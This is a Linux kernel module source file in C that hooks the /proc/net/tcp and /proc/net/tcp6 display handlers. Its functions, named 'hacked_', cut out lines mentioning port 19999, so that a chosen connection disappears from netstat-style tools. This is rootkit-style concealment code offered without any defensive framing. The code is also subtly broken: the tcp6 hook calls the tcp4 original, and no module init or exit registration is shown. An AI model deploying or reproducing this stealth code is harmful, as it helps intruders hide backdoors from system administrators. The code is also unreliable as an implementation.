#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/init.h>
#include <linux/seq_file.h>
#include <net/tcp.h>

int (*orig_tcp4_seq_show)(struct seq_file*, void *) = NULL;
int (*orig_tcp6_seq_show)(struct seq_file*, void *) = NULL;

#define TMPSZ 150
#define PORT_TO_HIDE 19999

char *strnstr(const char *haystack, const char *needle, unsigned int n) {
    char *s = strstr(haystack, needle);
    if (s == NULL) {
        return NULL;
    }else if (s - haystack + strlen(needle) <= n) {
        return s;
    } else
        return NULL;
}


int hacked_tcp4_seq_ops(struct seq_file *seq, void *v) {
    int retval = orig_tcp4_seq_show(seq, v);

    char port[12];

    sprintf(port, "%04X", PORT_TO_HIDE);

    if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ))
        seq->count -= TMPSZ;
    return retval;
}


int hacked_tcp6_seq_ops(struct seq_file *seq, void *v) {
    int retval = orig_tcp4_seq_show(seq, v);

    char port[12];

    sprintf(port, "%04X", PORT_TO_HIDE);

    if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ))
        seq->count -= TMPSZ;
    return retval;
}


int init_socket_hook(void) {
    struct tcp_seq_afinfo *my_afinfo = NULL;
    struct proc_dir_entry *tcp_dir_entry = init_net.proc_net->subdir;

    while (strcmp(tcp_dir_entry->name, "tcp"))
        tcp_dir_entry = tcp_dir_entry->next;

    if ((my_afinfo = (struct tcp_seq_afinfo*) tcp_dir_entry->data)) {
        orig_tcp4_seq_show = my_afinfo->seq_ops.show;
        my_afinfo->seq_ops.show = hacked_tcp4_seq_ops;
    }

    tcp_dir_entry = init_net.proc_net->subdir;

    while (strcmp(tcp_dir_entry->name, "tcp6"))
        tcp_dir_entry = tcp_dir_entry->next;

    if ((my_afinfo = (struct tcp_seq_afinfo*) tcp_dir_entry->data)) {
        orig_tcp6_seq_show = my_afinfo->seq_ops.show;
        my_afinfo->seq_ops.show = hacked_tcp6_seq_ops;
    }
    return 0;
}



void exit_socket_hook(void) {
    struct tcp_seq_afinfo *my_afinfo = NULL;
    struct proc_dir_entry *tcp_dir_entry = init_net.proc_net->subdir;

    while (strcmp(tcp_dir_entry->name, "tcp"))
        tcp_dir_entry = tcp_dir_entry->next;

    if ((my_afinfo = (struct tcp_seq_afinfo*) tcp_dir_entry->data)) {
        my_afinfo->seq_ops.show = orig_tcp4_seq_show;
    }

    tcp_dir_entry = init_net.proc_net->subdir;

    while (strcmp(tcp_dir_entry->name, "tcp6"))
        tcp_dir_entry = tcp_dir_entry->next;

    if ((my_afinfo = (struct tcp_seq_afinfo*) tcp_dir_entry->data)) {
        my_afinfo->seq_ops.show = orig_tcp6_seq_show;
    }

}
